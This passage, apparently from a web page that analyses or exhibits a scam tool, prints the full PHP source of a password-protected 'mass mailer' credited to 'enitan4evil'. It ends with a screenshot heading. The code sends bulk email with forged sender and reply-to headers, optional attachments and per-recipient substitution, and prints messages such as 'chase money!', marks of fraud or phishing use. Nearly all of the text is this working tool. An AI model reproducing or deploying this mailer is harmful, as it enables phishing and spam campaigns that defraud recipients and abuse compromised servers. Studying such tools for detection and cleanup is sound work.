+<span class="lineno"> 29</span> <span class="s2">color=red&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;center&amp;gt;Mailer&amp;lt;/center&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno"> 30</span> <span class="s2"> &amp;lt;input type=password name=pass size=30&amp;gt;</span>
+<span class="lineno"> 31</span> <span class="s2"> &amp;lt;/form&amp;gt;</span>
+<span class="lineno"> 32</span> <span class="s2"> &amp;lt;b&amp;gt;Host:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;</span>
+<span class="lineno"> 33</span> <span class="s2"> &amp;lt;b&amp;gt;IP:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;</span>
+<span class="lineno"> 34</span> <span class="s2"> &amp;lt;b&amp;gt;Your ip:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span>
+<span class="lineno"> 35</span> <span class="s2"> &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
+<span class="lineno"> 36</span> <span class="s2"> &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
+<span class="lineno"> 37</span> <span class="s2"> &quot;</span><span class="p">);</span>
+<span class="lineno"> 38</span> <span class="p">}</span>
+<span class="lineno"> 39</span> <span class="p">}</span>
+<span class="lineno"> 40</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">){</span>
+<span class="lineno"> 41</span> <span class="nv">$action</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">];</span>
+<span class="lineno"> 42</span> <span class="nv">$message</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">];</span>
+<span class="lineno"> 43</span> <span class="nv">$emaillist</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;emaillist&#39;</span><span class="p">];</span>
+<span class="lineno"> 44</span> <span class="nv">$from</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
+<span class="lineno"> 45</span> <span class="nv">$replyto</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;replyto&#39;</span><span class="p">];</span>
+<span class="lineno"> 46</span> <span class="nv">$subject</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;subject&#39;</span><span class="p">];</span>
+<span class="lineno"> 47</span> <span class="nv">$realname</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;realname&#39;</span><span class="p">];</span>
+<span class="lineno"> 48</span> <span class="nv">$file_name</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+<span class="lineno"> 49</span> <span class="nv">$contenttype</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contenttype&#39;</span><span class="p">];</span>
+<span class="lineno"> 50</span>        <span class="nv">$message</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
+<span class="lineno"> 51</span>        <span class="nv">$message</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;%5C%22&quot;</span><span class="p">,</span> <span class="s2">&quot;%22&quot;</span><span class="p">,</span> <span class="nv">$message</span><span class="p">);</span>
+<span class="lineno"> 52</span>        <span class="nv">$message</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
+<span class="lineno"> 53</span>        <span class="nv">$message</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
+<span class="lineno"> 54</span>        <span class="nv">$subject</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$subject</span><span class="p">);</span>
+<span class="lineno"> 55</span> <span class="p">}</span>
+<span class="lineno"> 56</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="lineno"> 57</span> <span class="x">&amp;lt;html&amp;gt;</span>
+<span class="lineno"> 58</span> <span class="x">&amp;lt;head&amp;gt;</span>
+<span class="lineno"> 59</span> <span class="x">&amp;lt;title&amp;gt;.:: mass mailer ::.&amp;lt;/title&amp;gt;</span>
+<span class="lineno"> 60</span> <span class="x">&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&amp;gt;</span>
+<span class="lineno"> 61</span> <span class="x">&amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
+<span class="lineno"> 62</span> <span class="x">&amp;lt;!--</span>
+<span class="lineno"> 63</span> <span class="x">.style1 {</span>
+<span class="lineno"> 64</span> <span class="x">       font-family: Geneva, Arial, Helvetica, sans-serif;</span>
+<span class="lineno"> 65</span> <span class="x">       font-size: 12px;</span>
+<span class="lineno"> 66</span> <span class="x">}</span>
+<span class="lineno"> 67</span> <span class="x">--&amp;gt;</span>
+<span class="lineno"> 68</span> <span class="x">&amp;lt;/style&amp;gt;</span>
+<span class="lineno"> 69</span> <span class="x">&amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
+<span class="lineno"> 70</span> <span class="x">&amp;lt;!--</span>
+<span class="lineno"> 71</span> <span class="x">.style1 {</span>
+<span class="lineno"> 72</span> <span class="x">       font-size: 20px;</span>
+<span class="lineno"> 73</span> <span class="x">       font-family: Geneva, Arial, Helvetica, sans-serif;</span>
+<span class="lineno"> 74</span> <span class="x">}</span>
+<span class="lineno"> 75</span> <span class="x">body {</span>
+<span class="lineno"> 76</span> <span class="x">   background-color: #000000;</span>
+<span class="lineno"> 77</span> <span class="x">}</span>
+<span class="lineno"> 78</span> <span class="x">.style2 {font-family: Georgia, &quot;Times New Roman&quot;, Times, serif}</span>
+<span class="lineno"> 79</span> <span class="x">.style3 {</span>
+<span class="lineno"> 80</span> <span class="x">   color: #FF0000;</span>
+<span class="lineno"> 81</span> <span class="x">   font-weight: bold;</span>
+<span class="lineno"> 82</span> <span class="x">}</span>
+<span class="lineno"> 83</span> <span class="x">.style4 {color: #999999}</span>
+<span class="lineno"> 84</span> <span class="x">--&amp;gt;</span>
+<span class="lineno"> 85</span> <span class="x">&amp;lt;/style&amp;gt;</span>
+<span class="lineno"> 86</span> <span class="x">&amp;lt;/head&amp;gt;</span>
+<span class="lineno"> 87</span> <span class="x">&amp;lt;body text=&quot;#ffffff&quot;&amp;gt;</span>
+<span class="lineno"> 88</span> <span class="x">&amp;lt;span class=&quot;style1&quot;&amp;gt;</span>
+<span class="lineno"> 89</span> <span class="x">&amp;lt;center&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno"> 90</span> <span class="x"> &amp;lt;SPAN lang=ar-sa&amp;gt;&amp;lt;FONT style=&quot;FONT-SIZE: 70pt&quot;</span>
+<span class="lineno"> 91</span> <span class="x">face=Webdings</span>
+<span class="lineno"> 92</span> <span class="x">color=#ff0000&amp;gt;!&amp;lt;/FONT&amp;gt;&amp;lt;/SPAN&amp;gt;&amp;lt;/FONT&amp;gt;&amp;lt;/br&amp;gt;</span>
+<span class="lineno"> 93</span> <span class="x">&amp;lt;/center&amp;gt;</span>
+<span class="lineno"> 94</span> <span class="x">&amp;lt;br&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;</span>
+<span class="lineno"> 95</span> <span class="x">&amp;lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;</span>
+<span class="lineno"> 96</span> <span class="x">       &amp;lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;send&quot;&amp;gt;</span>
+<span class="lineno"> 97</span> <span class="x">       &amp;lt;br&amp;gt;</span>
+<span class="lineno"> 98</span> <span class="x"> &amp;lt;table width=&quot;100%&quot; border=&quot;0&quot;&amp;gt;</span>
+<span class="lineno"> 99</span> <span class="x">   &amp;lt;tr&amp;gt;</span>
+<span class="lineno">100</span> <span class="x">     &amp;lt;td width=&quot;10%&quot;&amp;gt;</span>
+<span class="lineno">101</span> <span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
+<span class="lineno">102</span> <span class="x">Helvetica, sans-serif&quot;&amp;gt;Email:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="lineno">103</span> <span class="x">     &amp;lt;/td&amp;gt;</span>
+<span class="lineno">104</span> <span class="x">     &amp;lt;td width=&quot;18%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
+<span class="lineno">105</span> <span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="lineno">106</span> <span class="x">       &amp;lt;input type=&quot;text&quot; name=&quot;from&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$from</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;</span>
+<span class="lineno">107</span> <span class="x">size=&quot;30&quot;&amp;gt;</span>
+<span class="lineno">108</span> <span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="lineno">109</span> <span class="x">     &amp;lt;td width=&quot;31%&quot;&amp;gt;</span>
+<span class="lineno">110</span> <span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
+<span class="lineno">111</span> <span class="x">Helvetica, sans-serif&quot;&amp;gt;Name:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="lineno">112</span> <span class="x">     &amp;lt;/td&amp;gt;</span>
+<span class="lineno">113</span> <span class="x">     &amp;lt;td width=&quot;41%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
+<span class="lineno">114</span> <span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="lineno">115</span> <span class="x">       &amp;lt;input type=&quot;text&quot; name=&quot;realname&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$realname</span><span class="p">;</span>
+<span class="lineno">116</span> <span class="cp">?&gt;</span><span class="x">&quot; size=&quot;30&quot;&amp;gt;</span>
+<span class="lineno">117</span> <span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="lineno">118</span> <span class="x">   &amp;lt;/tr&amp;gt;</span>
+<span class="lineno">119</span> <span class="x">   &amp;lt;tr&amp;gt;</span>
+<span class="lineno">120</span> <span class="x">     &amp;lt;td width=&quot;10%&quot;&amp;gt;</span>
+<span class="lineno">121</span> <span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
+<span class="lineno">122</span> <span class="x">Helvetica, sans-serif&quot;&amp;gt;Reply:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="lineno">123</span> <span class="x">     &amp;lt;/td&amp;gt;</span>
+<span class="lineno">124</span> <span class="x">     &amp;lt;td width=&quot;18%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
+<span class="lineno">125</span> <span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="lineno">126</span> <span class="x">       &amp;lt;input type=&quot;text&quot; name=&quot;replyto&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$replyto</span><span class="p">;</span>
+<span class="lineno">127</span> <span class="cp">?&gt;</span><span class="x">&quot; size=&quot;30&quot;&amp;gt;</span>
+<span class="lineno">128</span> <span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="lineno">129</span> <span class="x">     &amp;lt;td width=&quot;31%&quot;&amp;gt;</span>
+<span class="lineno">130</span> <span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
+<span class="lineno">131</span> <span class="x">Helvetica, sans-serif&quot;&amp;gt;Attach</span>
+<span class="lineno">132</span> <span class="x">         File:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="lineno">133</span> <span class="x">     &amp;lt;/td&amp;gt;</span>
+<span class="lineno">134</span> <span class="x">     &amp;lt;td width=&quot;41%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
+<span class="lineno">135</span> <span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="lineno">136</span> <span class="x">       &amp;lt;input type=&quot;file&quot; name=&quot;file&quot; size=&quot;30&quot;&amp;gt;</span>
+<span class="lineno">137</span> <span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="lineno">138</span> <span class="x">   &amp;lt;/tr&amp;gt;</span>
+<span class="lineno">139</span> <span class="x">   &amp;lt;tr&amp;gt;</span>
+<span class="lineno">140</span> <span class="x">     &amp;lt;td width=&quot;10%&quot;&amp;gt;</span>
+<span class="lineno">141</span> <span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
+<span class="lineno">142</span> <span class="x">Helvetica, sans-serif&quot;&amp;gt;Subject:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="lineno">143</span> <span class="x">     &amp;lt;/td&amp;gt;</span>
+<span class="lineno">144</span> <span class="x">     &amp;lt;td colspan=&quot;3&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
+<span class="lineno">145</span> <span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="lineno">146</span> <span class="x">       &amp;lt;input type=&quot;text&quot; name=&quot;subject&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$subject</span><span class="p">;</span>
+<span class="lineno">147</span> <span class="cp">?&gt;</span><span class="x">&quot; size=&quot;66&quot;&amp;gt;</span>
+<span class="lineno">148</span> <span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="lineno">149</span> <span class="x">   &amp;lt;/tr&amp;gt;</span>
+<span class="lineno">150</span> <span class="x">   &amp;lt;tr&amp;gt;</span>
+<span class="lineno">151</span> <span class="x">     &amp;lt;td width=&quot;10%&quot; valign=&quot;top&quot;&amp;gt;</span>
+<span class="lineno">152</span> <span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
+<span class="lineno">153</span> <span class="x">Helvetica, sans-serif&quot;&amp;gt;Mail:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="lineno">154</span> <span class="x">     &amp;lt;/td&amp;gt;</span>
+<span class="lineno">155</span> <span class="x">     &amp;lt;td width=&quot;18%&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana,</span>
+<span class="lineno">156</span> <span class="x">Arial, Helvetica,</span>
+<span class="lineno">157</span> <span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="lineno">158</span> <span class="x">       &amp;lt;textarea name=&quot;message&quot; cols=&quot;50&quot; rows=&quot;10&quot;&amp;gt;</span><span class="cp">&lt;?</span> <span class="k">print</span>
+<span class="lineno">159</span> <span class="nv">$message</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;</span>
+<span class="lineno">160</span> <span class="x">       &amp;lt;br&amp;gt;</span>
+<span class="lineno">161</span> <span class="x">       &amp;lt;input type=&quot;radio&quot; name=&quot;contenttype&quot; value=&quot;plain&quot;&amp;gt;</span>
+<span class="lineno">162</span> <span class="x">       Text</span>
+<span class="lineno">163</span> <span class="x">       &amp;lt;input name=&quot;contenttype&quot; type=&quot;radio&quot; value=&quot;html&quot; checked&amp;gt;</span>
+<span class="lineno">164</span> <span class="x">       HTML</span>
+<span class="lineno">165</span> <span class="x">       &amp;lt;input type=&quot;submit&quot; value=&quot;BomB WellA&quot;&amp;gt;</span>
+<span class="lineno">166</span> <span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="lineno">167</span> <span class="x">     &amp;lt;td width=&quot;31%&quot; valign=&quot;top&quot;&amp;gt;</span>
+<span class="lineno">168</span> <span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;</span>
+<span class="lineno">169</span> <span class="x">         &amp;lt;font face=&quot;Verdana, Arial,</span>
+<span class="lineno">170</span> <span class="x">Helvetica, sans-serif&quot; size=&quot;-3&quot;&amp;gt;Mail  to:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="lineno">171</span> <span class="x">     &amp;lt;/td&amp;gt;</span>
+<span class="lineno">172</span> <span class="x">     &amp;lt;td width=&quot;41%&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana,</span>
+<span class="lineno">173</span> <span class="x">Arial, Helvetica, sans-serif&quot;&amp;gt;</span>
+<span class="lineno">174</span> <span class="x">       &amp;lt;textarea name=&quot;emaillist&quot; cols=&quot;30&quot; rows=&quot;10&quot;&amp;gt;</span><span class="cp">&lt;?</span> <span class="k">print</span>
+<span class="lineno">175</span> <span class="nv">$emaillist</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="lineno">176</span> <span class="x">   &amp;lt;/tr&amp;gt;</span>
+<span class="lineno">177</span> <span class="x"> &amp;lt;/table&amp;gt;</span>
+<span class="lineno">178</span> <span class="x">&amp;lt;/form&amp;gt;</span>
+<span class="lineno">179</span> <span class="cp">&lt;?</span>
+<span class="lineno">180</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$action</span><span class="p">){</span>
+<span class="lineno">181</span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$from</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$subject</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$message</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$emaillist</span><span class="p">){</span>
+<span class="lineno">182</span>        <span class="k">print</span> <span class="s2">&quot;Please complete all fields before sending your message.&quot;</span><span class="p">;</span>
+<span class="lineno">183</span>        <span class="k">exit</span><span class="p">;</span>
+<span class="lineno">184</span>    <span class="p">}</span>
+<span class="lineno">185</span>    <span class="nv">$allemails</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$emaillist</span><span class="p">);</span>
+<span class="lineno">186</span>            <span class="nv">$numemails</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$allemails</span><span class="p">);</span>
+<span class="lineno">187</span>          <span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$x</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$numemails</span><span class="p">;</span> <span class="nv">$x</span><span class="o">++</span><span class="p">){</span>
+<span class="lineno">188</span>                <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$allemails</span><span class="p">[</span><span class="nv">$x</span><span class="p">];</span>
+<span class="lineno">189</span>                <span class="k">if</span> <span class="p">(</span><span class="nv">$to</span><span class="p">){</span>
+<span class="lineno">190</span>                <span class="nv">$to</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
+<span class="lineno">191</span>                <span class="nv">$message</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;&amp;email&amp;&quot;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">,</span> <span class="nv">$message</span><span class="p">);</span>
+<span class="lineno">192</span>                <span class="nv">$subject</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;&amp;email&amp;&quot;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">);</span>
+<span class="lineno">193</span>                <span class="k">print</span> <span class="s2">&quot; </span><span class="si">$to</span><span class="s2">.......&quot;</span><span class="p">;</span>
+<span class="lineno">194</span>                <span class="nb">flush</span><span class="p">();</span>
+<span class="lineno">195</span>                <span class="nv">$header</span> <span class="o">=</span> <span class="s2">&quot;From: </span><span class="si">$realname</span><span class="s2"> &amp;lt;</span><span class="si">$from</span><span class="s2">&amp;gt;</span><span class="se">\r\n</span><span class="s2">Reply-To: </span><span class="si">$replyto\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">196</span>                <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;MIME-Version: 1.0</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">197</span>            <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Type: multipart/mixed;</span>
+<span class="lineno">198</span> <span class="s2">boundary=</span><span class="si">$uid\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">199</span>              <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;--</span><span class="si">$uid\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">200</span>                <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Type: text/</span><span class="si">$contenttype\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">201</span>                <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Transfer-Encoding: 8bit</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">202</span>                <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$message\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">203</span>            <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;--</span><span class="si">$uid\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">204</span>            <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Type: </span><span class="si">$file_type</span><span class="s2">;</span>
+<span class="lineno">205</span> <span class="s2">name=</span><span class="se">\&quot;</span><span class="si">$file_name\</span><span class="s2">&quot;</span><span class="nx">\r\n</span><span class="s2">&quot;;</span>
+<span class="lineno">206</span> <span class="s2">           If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Transfer</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">base64\r\n</span><span class="s2">&quot;;</span>
+<span class="lineno">207</span> <span class="s2">           If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span>
+<span class="lineno">208</span> <span class="nx">attachment</span><span class="p">;</span> <span class="nx">filename</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$file_name\</span><span class="s2">&quot;</span><span class="nx">\r\n\r\n</span><span class="s2">&quot;;</span>
+<span class="lineno">209</span> <span class="s2">           If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="nv">$content\r\n</span><span class="s2">&quot;;</span>
+<span class="lineno">210</span> <span class="s2">           If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="o">--</span><span class="nv">$uid</span><span class="o">--</span><span class="s2">&quot;;</span>
+<span class="lineno">211</span> <span class="s2">               mail(</span><span class="si">$to</span><span class="s2">, </span><span class="si">$subject</span><span class="s2">, &quot;&quot;, </span><span class="si">$header</span><span class="s2">);</span>
+<span class="lineno">212</span> <span class="s2">               print &quot;</span><span class="nx">chase</span> <span class="nx">money</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
+<span class="lineno">213</span> <span class="s2">               flush();</span>
+<span class="lineno">214</span> <span class="s2">               }</span>
+<span class="lineno">215</span> <span class="s2">               }</span>
+<span class="lineno">216</span> <span class="s2">}</span>
+<span class="lineno">217</span> <span class="s2">?&gt;</span>
+<span class="lineno">218</span> <span class="s2">&amp;lt;style type=&quot;</span><span class="nx">text</span><span class="o">/</span><span class="nx">css</span><span class="s2">&quot;&amp;gt;</span>
+<span class="lineno">219</span> <span class="s2">&amp;lt;!--</span>
+<span class="lineno">220</span> <span class="s2">.style1 {</span>
+<span class="lineno">221</span> <span class="s2">   font-size: 20px;</span>
+<span class="lineno">222</span> <span class="s2">   font-family: Geneva, Arial, Helvetica, sans-serif;</span>
+<span class="lineno">223</span> <span class="s2">}</span>
+<span class="lineno">224</span> <span class="s2">--&amp;gt;</span>
+<span class="lineno">225</span> <span class="s2">&amp;lt;/style&amp;gt;&amp;lt;center&amp;gt;</span>
+<span class="lineno">226</span> <span class="s2">&amp;lt;p class=&quot;</span><span class="nx">style1</span> <span class="nx">style2</span> <span class="nx">style3</span> <span class="nx">style4</span><span class="s2">&quot;&amp;gt;&amp;lt;p class=&quot;</span><span class="nx">style1</span><span class="s2">&quot;&amp;gt;PHP Mailer&amp;lt;br&amp;gt;</span>
+<span class="lineno">227</span> <span class="s2"> &amp;copy enitan4evil@hotmail.com&amp;lt;br&amp;gt;</span>
+<span class="lineno">228</span> <span class="s2">     &amp;lt;/p&amp;gt;  &amp;lt;/p&amp;gt;</span>
+<span class="lineno">229</span> <span class="s2">&amp;lt;/center&amp;gt;</span>
+<span class="lineno">230</span> <span class="s2">&lt;?php</span>
+<span class="lineno">231</span> <span class="s2">if(isset(</span><span class="si">$_POST[&#39;action&#39;]</span><span class="s2">) &amp;&amp; </span><span class="si">$numemails</span><span class="s2"> !==0 ){echo</span>
+<span class="lineno">232</span> <span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Sending Completed\\r\\nTotal Email</span>
+<span class="lineno">233</span> <span class="s1">$numemails\\r\\n-Shout Lastborn and Hustle On!&#39;</span><span class="p">);</span>
+<span class="lineno">234</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
+<span class="lineno">235</span> <span class="s2">?&gt;</span>
+<span class="lineno">236</span> <span class="s2">&amp;lt;/body&amp;gt;</span>
+<span class="lineno">237</span> <span class="s2">&amp;lt;/html&amp;gt;</span></code></pre></div>
 
 <h3>Enitan AKA virus screenshot</h3>
 
